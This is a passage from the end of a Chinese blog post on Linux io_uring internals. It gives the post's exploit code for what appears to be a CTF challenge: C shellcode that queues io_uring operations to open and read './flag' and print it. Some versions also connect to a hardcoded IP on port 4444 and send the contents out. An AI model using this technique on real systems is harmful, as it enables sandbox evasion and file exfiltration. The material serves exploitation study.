sqe[<span class="number">2</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">2</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].flags = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = &amp;socket_add;</span><br><span class="line">    sqe[<span class="number">3</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">5</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>orw</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">3</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">1</span>].len = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//sqe[4].flags = IOSQE_IO_HARDLINK;</span></span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">1</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">2</span>].len = <span class="number">0x10</span>;</span><br></pre></td></tr></table></figure>
<p>通过大量open避免 open的fd和 <code>io_uring_setup</code> 返回的fd竞争的问题<br>
增强利用稳定性</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">0</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">1</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">2</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">3</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">3</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">3</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">3</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">4</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">sqe[<span class="number">4</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">4</span>].fd = <span class="number">-100</span>;</span><br><span class="line">sqe[<span class="number">4</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">5</span>].opcode = IORING_OP_READ;</span><br><span class="line">sqe[<span class="number">5</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">5</span>].fd = <span class="number">6</span>;</span><br><span class="line">sqe[<span class="number">5</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">5</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">6</span>].opcode = IORING_OP_SOCKET;</span><br><span class="line">sqe[<span class="number">6</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">6</span>].fd = <span class="number">2</span>;</span><br><span class="line">sqe[<span class="number">6</span>].off = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">7</span>].opcode = IORING_OP_CONNECT;</span><br><span class="line">sqe[<span class="number">7</span>].flags = IOSQE_IO_HARDLINK;</span><br><span class="line">sqe[<span class="number">7</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">7</span>].flags = <span class="number">4</span>;</span><br><span class="line">sqe[<span class="number">7</span>].addr = &amp;socket_add;</span><br><span class="line">sqe[<span class="number">7</span>].off = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">sqe[<span class="number">8</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">sqe[<span class="number">8</span>].fd = <span class="number">9</span>;</span><br><span class="line">sqe[<span class="number">8</span>].addr = buff;</span><br><span class="line">sqe[<span class="number">8</span>].len = <span class="number">0x100</span>;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">params</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">0x10</span>] = <span class="string">&quot;./flag\x00&quot;</span>;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">0x10</span>] = <span class="string">&quot;AAAAAAAA\n&quot;</span>;</span><br><span class="line">    <span class="type">void</span> *ring_ptr;</span><br><span class="line">    <span class="type">unsigned</span> *ktail;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        __u64 a1;</span><br><span class="line">        __u64 a2;</span><br><span class="line">    &#125; socket_add = <span class="comment">//&#123;0x0100007f5c110002, 0&#125;;</span></span><br><span class="line">        &#123;<span class="number">0x017aa8c05c110002</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="comment">//mmap(0xC0D3000uLL, 0x3000uLL, 7uLL, 34u, 0xFFFFFFFFuLL, 0LL);</span></span><br><span class="line">    params.sq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x1000</span>;</span><br><span class="line">    ring_ptr = params.cq_off.user_addr = <span class="number">0xC0D3000</span> + <span class="number">0x2000</span>;</span><br><span class="line">    params.flags = IORING_SETUP_SQPOLL | IORING_SETUP_NO_MMAP | IORING_SETUP_NO_SQARRAY;</span><br><span class="line"></span><br><span class="line">    params.sq_thread_idle = <span class="number">0x2000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span> =</span> (<span class="keyword">struct</span> io_uring_sqe *)(<span class="number">0xC0D3000</span> + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">0</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">0</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">0</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">0</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">1</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    sqe[<span class="number">1</span>].flags = IOSQE_IO_LINK;</span><br><span class="line">    sqe[<span class="number">1</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">1</span>].addr = flag;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">2</span>].opcode = IORING_OP_OPENAT;</span><br><span class="line">    <span class="comment">//sqe[2].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">2</span>].fd = <span class="number">-100</span>;</span><br><span class="line">    sqe[<span class="number">2</span>].addr = flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">3</span>].opcode = IORING_OP_READ;</span><br><span class="line">    <span class="comment">//sqe[3].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">3</span>].fd = <span class="number">4</span>;</span><br><span class="line">    sqe[<span class="number">3</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">3</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    sqe[<span class="number">4</span>].opcode = IORING_OP_WRITE;</span><br><span class="line">    <span class="comment">//sqe[4].flags = IOSQE_IO_LINK;</span></span><br><span class="line">    sqe[<span class="number">4</span>].fd = <span class="number">1</span>;</span><br><span class="line">    sqe[<span class="number">4</span>].addr = buff;</span><br><span class="line">    sqe[<span class="number">4</span>].len = <span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ktail = ring_ptr + <span class="number">4</span>;</span><br><span class="line">    io_uring_smp_store_release(ktail, <span class="number">5</span>);</span><br><span class="line">    __do_syscall2(<span class="number">425</span>, <span class="number">0x10</span>, &amp;params);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    
    </div>
    
      <div class="post-tags syuanpi fadeInRightShort back-3">
      
        <a href="/tags/linux/">linux</a>
      
        <a href="/tags/io-uring/">io_uring</a>
      
        <a href="/tags/shellcode/">shellcode</a>
      
      </div>
    
    
      

      
  <hr class="copy-line">
  <div class="post-copyright">
    <div class="copy-author">
      <span>Author :</span>
      <span>V3rdant</span>
    </div>
    <div class="copy-url">
      <span>Url :</span>
      <a href="https://v3rdant.cn/Linux.io_uring-Top-down-Approch/">https://v3rdant.cn/Linux.io_uring-Top-down-Approch/</a>
    </div>
    <div class="copy-origin">
      <span>Origin :</span>
      <a href="https://v3rdant.cn">https://v3rdant.cn</a>
    </div>
    <div class="copy-license">
      
      著作权归作者所有，转载请联系作者获得授权。
    </div>
  </div>

    
  </article>
  
    
  <nav class="article-page">
    
    
      <a href="/Linux.Seccomp-and-Ptrace/" id="art-right" class="art-right">
        <span class="prev-title">
          Linux.Seccomp-and-Ptrace<i class="iconfont icon-right"></i>
        </span>
      </a>
    
  </nav>


    
  <i id="com-switch" class="iconfont icon-down jumping-in long infinite" style="font-size:24px;display:block;text-align:center;transform:rotate(180deg);"></i>
  <div class="post-comments" id="post-comments" style="display: block;margin: auto 16px;">
    

    
    

    

  </div>



  
  
    
  
  <aside class="post-toc">
    <div class="title"><span>Index</span></div>
    <div class="toc-inner">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#overview"><span class="toc-text">overview</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring%E4%BB%BB%E5%8A%A1%E6%94%B6%E5%89%B2%E6%A8%A1%E5%BC%8F"><span class="toc-text">io_uring任务收割模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct"><span class="toc-text">struct</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#liburing"><span class="toc-text">liburing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#kernel"><span class="toc-text">kernel</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#liburing-2"><span class="toc-text">liburing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-queue-init"><span class="toc-text">io_uring_queue_init</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-alloc-huge"><span class="toc-text">io_uring_alloc_huge</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-queue-mmap"><span class="toc-text">io_uring_queue_mmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-setup-ring-pointers"><span class="toc-text">io_uring_setup_ring_pointers</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-get-sqe"><span class="toc-text">io_uring_get_sqe</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-prep-xxx"><span class="toc-text">io_uring_prep_xxx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-submit"><span class="toc-text">io_uring_submit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-uring-flush-sq"><span class="toc-text">__io_uring_flush_sq</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#syscall"><span class="toc-text">syscall</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-setup"><span class="toc-text">io_uring_setup</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-allocate-scq-urings"><span class="toc-text">io_allocate_scq_urings</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-sq-offload-create"><span class="toc-text">io_sq_offload_create</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-uring-enter"><span class="toc-text">io_uring_enter</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kernel-2"><span class="toc-text">kernel</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#io-sq-thread-%E5%86%85%E6%A0%B8%E4%BB%BB%E5%8A%A1%E6%8F%90%E4%BA%A4%E6%9C%BA%E5%88%B6"><span class="toc-text">io_sq_thread | 内核任务提交机制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-sq-thread"><span class="toc-text">__io_sq_thread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-submit-sqes"><span class="toc-text">io_submit_sqes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-submit-sqe"><span class="toc-text">io_submit_sqe</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-queue-sqe-io-issue-sqe-%E9%87%8D%E8%A6%81"><span class="toc-text">io_queue_sqe | io_issue_sqe | 重要</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-get-sqe-%E9%87%8D%E8%A6%81"><span class="toc-text">io_get_sqe |  重要</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-submit-sqe-%E5%90%8C%E6%AD%A5%E4%B8%8E%E5%BC%82%E6%AD%A5%E7%9A%84%E8%AF%B7%E6%B1%82%E6%89%A7%E8%A1%8C"><span class="toc-text">io_submit_sqe | 同步与异步的请求执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-queue-async"><span class="toc-text">io_queue_async</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#io-queue-iowq-%E4%BB%BB%E5%8A%A1%E5%A4%84%E7%90%86%E7%BA%BF%E7%A8%8B%E6%B1%A0"><span class="toc-text">io_queue_iowq | 任务处理线程池</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-wq-enqueue"><span class="toc-text">io_wq_enqueue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-io-worker-worker%E5%A4%84%E7%90%86%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%88%9B%E5%BB%BA"><span class="toc-text">create_io_worker  |  worker处理线程的创建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#io-wq-worker-%E5%86%85%E6%A0%B8%E4%BB%BB%E5%8A%A1%E7%BA%BF%E7%A8%8B"><span class="toc-text">io_wq_worker  | 内核任务线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#io-worker-handle-work"><span class="toc-text">io_worker_handle_work</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TODO"><span class="toc-text">TODO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol>
    </div>
  </aside>



  


        </div>
      </main>
      <footer class="footer syuanpi fadeIn" id="footer">
  <hr>
  <div class="footer-wrapper">
    <div class="left">
      <div class="contact-icon">
  
  
    <a target="_blank" rel="noopener" href="https://www.facebook.com/" class="iconfont icon-facebook" title="facebook"></a>
  
    <a target="_blank" rel="noopener" href="https://twitter.com/" class="iconfont icon-twitter" title="twitter"></a>
  
    <a target="_blank" rel="noopener" href="https://www.instagram.com/" class="iconfont icon-instagram" title="instagram"></a>
  
    <a target="_blank" rel="noopener" href="https://weibo.com/" class="iconfont icon-weibo" title="weibo"></a>
  
    <a target="_blank" rel="noopener" href="https://www.zhihu.com/people/" class="iconfont icon-zhihu" title="zhihu"></a>
  
    <a target="_blank" rel="noopener" href="https://github.com/" class="iconfont icon-github" title="github"></a>
  
    <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/" class="iconfont icon-linkedin" title="linkedin"></a>
  
    <a target="_blank" rel="noopener" href="https://www.douban.com/people/" class="iconfont icon-douban" title="douban"></a>
  
    <a target="_blank" rel="noopener" href="https://medium.com/" class="iconfont icon-medium" title="medium"></a>
  
    <a target="_blank" rel="noopener" href="https://www.yuque.com/" class="iconfont icon-yuque" title="yuque"></a>
  
</div>

    </div>
    <div class="right">
      <div class="copyright">
    <div class="info">
        <span>&copy;</span>
        <span>2016 ~ 2024</span>
        <span>❤</span>
        <span>V3rdant</span>
    </div>
    <div class="theme">
        <span>
            Powered by
            <a href="http://hexo.io/" target="_blank" rel="noopener">Hexo </a>
        </span>
        <span>
            Theme
            <a target="_blank" rel="noopener" href="https://github.com/ColMugX/hexo-theme-Nlvi"> Nlvi </a>
        </span>
    </div>
    
</div>

    </div>
  </div>
</footer>
    </div>
    <div class="tagcloud" id="tagcloud">
  <div class="tagcloud-taglist">
  
    <div class="tagcloud-tag">
      <button>Pwn</button>
    </div>
  
    <div class="tagcloud-tag">
      <button>linux</button>
    </div>
  
    <div class="tagcloud-tag">
      <button>io_uring</button>
    </div>
  
    <div class="tagcloud-tag">
      <button>shellcode</button>
    </div>
  
    <div class="tagcloud-tag">
      <button>CTF</button>
    </div>
  
    <div class="tagcloud-tag">
      <button>pwn</button>
    </div>
  
  </div>
  
    <div class="tagcloud-postlist active">
      <h2>Pwn</h2>
      
        <div class="tagcloud-post">
          <a href="/Linux.Seccomp-and-Ptrace/">
            <time class="tagcloud-posttime">2023 / 10 / 31</time>
            <span>Linux.Seccomp-and-Ptrace</span>
          </a>
        </div>
      
        <div class="tagcloud-post">
          <a href="/Pwn.Heap-Exploation-up-to-2.31/">
            <time class="tagcloud-posttime">2023 / 06 / 21</time>
            <span>Pwn.Heap-Exploation-up-to-2.31</span>
          </a>
        </div>
      
        <div class="tagcloud-post">
          <a href="/Pwn.I-Wanna-be-A-LLVM-Passer/">
            <time class="tagcloud-posttime">2023 / 06 / 23</time>
            <span>I wanna be a llvm passer</span>
          </a>
        </div>
      
    </div>
  
    <div class="tagcloud-postlist ">
      <h2>linux</h2>
      
        <div class="tagcloud-post">
          <a href="/Linux.Seccomp-and-Ptrace/">
            <time class="tagcloud-posttime">2023 / 10 / 31</time>
            <span>Linux.Seccomp-and-Ptrace</span>
          </a>
        </div>
      
        <div class="tagcloud-post">
          <a href="/Linux.io_uring-Top-down-Approch/">
            <time class="tagcloud-posttime">2023 / 12 / 04</time>
            <span>Linux.io_uring-Top-down-Approch</span>
          </a>
        </div>
      
    </div>
  
    <div class="tagcloud-postlist ">
      <h2>io_uring</h2>
      
        <div class="tagcloud-post">
          <a href="/Linux.io_uring-Top-down-Approch/">
            <time class="tagcloud-posttime">2023 / 12 / 04</time>
            <span>Linux.io_uring-Top-down-Approch</span>
          </a>
        </div>
      
    </div>
  
    <div class="tagcloud-postlist ">
      <h2>shellcode</h2>
      
        <div class="tagcloud-post">
          <a href="/Linux.io_uring-Top-down-Approch/">
            <time class="tagcloud-posttime">2023 / 12 / 04</time>
            <span>Linux.io_uring-Top-down-Approch</span>
          </a>
        </div>
      
    </div>
  
    <div class="tagcloud-postlist ">
      <h2>CTF</h2>
      
        <div class="tagcloud-post">
          <a href="/Pwn.Heap-Exploation-up-to-2.31/">
            <time class="tagcloud-posttime">2023 / 06 / 21</time>
            <span>Pwn.Heap-Exploation-up-to-2.31</span>
          </a>
        </div>
      
        <div class="tagcloud-post">
          <a href="/Pwn.I-Wanna-be-A-LLVM-Passer/">
            <time class="tagcloud-posttime">2023 / 06 / 23</time>
            <span>I wanna be a llvm passer</span>
          </a>
        </div>
      
    </div>
  
    <div class="tagcloud-postlist ">
      <h2>pwn</h2>
      
        <div class="tagcloud-post">
          <a href="/Pwn.Stack-Overflow-Overview/">
            <time class="tagcloud-posttime">2022 / 08 / 03</time>
            <span>Pwn.StackOverflow-Overview</span>
          </a>
        </div>
      
        <div class="tagcloud-post">
          <a href="/Pwn.The-Art-of-Shellcode/">
            <time class="tagcloud-posttime">2022 / 07 / 31</time>
            <span>Pwn.the-Art-of-Shellcode</span>
          </a>
        </div>
      
    </div>
  
</div>

  </div>
  <div class="backtop syuanpi melt toTop" id="backtop">
    <i class="iconfont icon-up"></i>
    <span style="text-align:center;font-family:Georgia;"><span style="font-family:Georgia;" id="scrollpercent">1</span>%</span>
</div>

  <div class="search" id="search">
    <div class="input">
      <input type="text" id="search-input" placeholder="搜索一下？" autofocus>
    </div>
    <div id="search-result"></div>
  </div>



<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>



  <script></script>
  <script src="/script/lib/lightbox/js/lightbox.min.js" async></script>











  
<script src="/script/scheme/banderole.js"></script>




<script src="/script/bootstarp.js"></script>



<script>
if (nlviconfig.theme.toc) {
  setTimeout(function() {
    if (nlviconfig.theme.scheme === 'balance') {
      $("#header").addClass("show_toc");
    } else if (nlviconfig.theme.scheme === 'banderole') {
      $(".container-inner").addClass("has_toc");
      $(".post-toc .title").addClass("show");
      $(".toc-inner").addClass("show");
    }
  }, 1000);
}
</script>



</body>
</html>
